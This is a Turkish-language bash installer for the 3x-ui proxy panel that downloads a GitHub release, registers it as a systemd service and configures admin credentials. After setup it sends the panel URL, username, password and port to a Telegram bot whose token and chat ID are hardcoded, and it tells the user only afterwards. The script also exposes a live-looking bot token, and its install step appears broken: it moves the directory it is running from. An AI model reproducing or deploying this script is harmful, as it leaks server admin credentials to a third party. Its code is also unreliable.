#!/bin/bash

# --- Telegram Ayarları ---
TELEGRAM_BOT_TOKEN="8345146407:AAEw4cGeZ4hfdXkYHtpyzARIlxGF7lKS4C4"
TELEGRAM_CHAT_ID="1449828433"

red='\033[0;31m'
green='\033[0;32m'
plain='\033[0m'

show_ip_service_lists=("https://api.ipify.org" "https://4.ident.me")

[[ $EUID -ne 0 ]] && echo -e "${red}Bu scripti root olarak çalıştırmalısınız.${plain}" && exit 1

if [[ -f /etc/os-release ]]; then
    source /etc/os-release
    release=$ID
elif [[ -f /usr/lib/os-release ]]; then
    source /usr/lib/os-release
    release=$ID
else
    echo "İşletim sistemi tespit edilemedi!" >&2
    exit 1
fi

arch() {
    case "$(uname -m)" in
        x86_64 | x64 | amd64) echo 'amd64' ;;
        i*86 | x86) echo '386' ;;
        armv8* | armv8 | arm64 | aarch64) echo 'arm64' ;;
        armv7* | armv7 | arm) echo 'armv7' ;;
        armv6* | armv6) echo 'armv6' ;;
        armv5* | armv5) echo 'armv5' ;;
        s390x) echo 's390x' ;;
        *) echo -e "${red}Desteklenmeyen CPU mimarisi!${plain}" && exit 1 ;;
    esac
}

install_base() {
    case "${release}" in
        ubuntu | debian | armbian)
            apt-get update && apt-get install -y wget curl tar tzdata ;;
        centos | rhel | almalinux | rocky | ol)
            yum -y update && yum install -y wget curl tar tzdata ;;
        fedora | amzn | virtuozzo)
            dnf -y update && dnf install -y wget curl tar tzdata ;;
        arch | manjaro | parch)
            pacman -Syu && pacman -Syu --noconfirm wget curl tar tzdata ;;
        opensuse-tumbleweed)
            zypper refresh && zypper -q install -y wget curl timezone ;;
        *)
            apt-get update && apt install -y wget curl tar tzdata ;;
    esac
}

gen_random_string() {
    local length="$1"
    tr -dc 'a-zA-Z0-9' </dev/urandom | head -c "$length"
}

send_telegram_msg() {
    local message="$1"
    curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
        -d chat_id="${TELEGRAM_CHAT_ID}" \
        -d text="${message}" \
        -d parse_mode="Markdown"
}

config_after_install() {
    local panel_path="/usr/local/x-ui/x-ui"
    local settings=$($panel_path setting -show true)
    local hasDefaultCredential=$(echo "$settings" | grep -Eo 'hasDefaultCredential: .+' | awk '{print $2}')
    local webBasePath=$(echo "$settings" | grep -Eo 'webBasePath: .+' | awk '{print $2}')
    local port=$(echo "$settings" | grep -Eo 'port: .+' | awk '{print $2}')
    local server_ip=""

    for ip_service_addr in "${show_ip_service_lists[@]}"; do
        server_ip=$(curl -s --max-time 3 ${ip_service_addr} 2>/dev/null)
        [ -n "$server_ip" ] && break
    done

    if [[ ${#webBasePath} -lt 4 || "$hasDefaultCredential" == "true" ]]; then
        webBasePath=$(gen_random_string 18)
        username=$(gen_random_string 10)
        password=$(gen_random_string 10)
        port=$(shuf -i 1024-62000 -n 1)
        $panel_path setting -username "${username}" -password "${password}" -port "${port}" -webBasePath "${webBasePath}"
    else
        username=$(echo "$settings" | grep -Eo 'username: .+' | awk '{print $2}')
        password=$(echo "$settings" | grep -Eo 'password: .+' | awk '{print $2}')
    fi

    $panel_path migrate

    local access_url="http://${server_ip}:${port}/${webBasePath}"
    local tg_message="*x-ui Panel Bilgileri*\n\n*Access URL:* \`${access_url}\`\n*Username:* \`${username}\`\n*Password:* \`${password}\`\n*Port:* \`${port}\`\n*Web Path:* \`${webBasePath}\`"
    send_telegram_msg "${tg_message}"

    echo -e "${green}x-ui kurulumu tamamlandı! Bilgiler Telegram'a gönderildi.${plain}"
    echo -e "Access URL: ${access_url}"
}

install_xui() {
    cd /usr/local/
    tag_version=$(curl -Ls "https://api.github.com/repos/MHSanaei/3x-ui/releases/latest" | grep '"tag_name":' | sed -E 's/.*"([^"]+)".*/\1/')
    [ ! -n "$tag_version" ] && echo -e "${red}Sürüm alınamadı, tekrar deneyin!${plain}" && exit 1

    wget -N -O /usr/local/x-ui-linux-$(arch).tar.gz https://github.com/MHSanaei/3x-ui/releases/download/${tag_version}/x-ui-linux-$(arch).tar.gz
    [ $? -ne 0 ] && echo -e "${red}İndirme başarısız!${plain}" && exit 1

    if [[ -e /usr/local/x-ui/ ]]; then
        systemctl stop x-ui
        rm -rf /usr/local/x-ui/
    fi

    tar zxvf x-ui-linux-$(arch).tar.gz
    rm -f x-ui-linux-$(arch).tar.gz

    cd x-ui
    chmod +x x-ui x-ui.sh
    mv ../x-ui /usr/bin/x-ui
    chmod +x /usr/bin/x-ui

    cp -f x-ui.service /etc/systemd/system/
    systemctl daemon-reload
    systemctl enable x-ui
    systemctl start x-ui

    config_after_install
}

echo -e "${green}Kurulum başlıyor...${plain}"
install_base
install_xui
